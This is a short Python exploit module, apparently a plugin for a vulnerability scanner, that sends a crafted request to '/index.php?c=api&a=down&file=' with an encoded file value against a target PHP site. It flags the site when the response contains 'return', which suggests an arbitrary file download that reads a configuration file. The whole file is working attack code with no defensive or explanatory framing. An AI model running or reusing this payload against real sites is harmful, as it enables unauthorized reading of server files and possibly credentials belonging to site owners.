# coding: utf-8
import requests
import re

class Exploit:

    payload = "/index.php?c=api&a=down&file=NDgwNTA0M2RFRXRkc1ZTaGNuczJBSjZTSk9KSDVTYnFqL251K0lNRjBQK0tla0FBTVpHM3dLbU8yVTNWaE1SYTRtRXRjUlQ3bDd4cGRQeVRKMGVlcDEvQjNRVlA4bTNnMi9SZDRDSjBOUQ"
    comp = r'return'

    def attack(self, url):
        response = requests.get(url+self.payload)
        if re.search(self.comp, response.text):
            return url+self.payload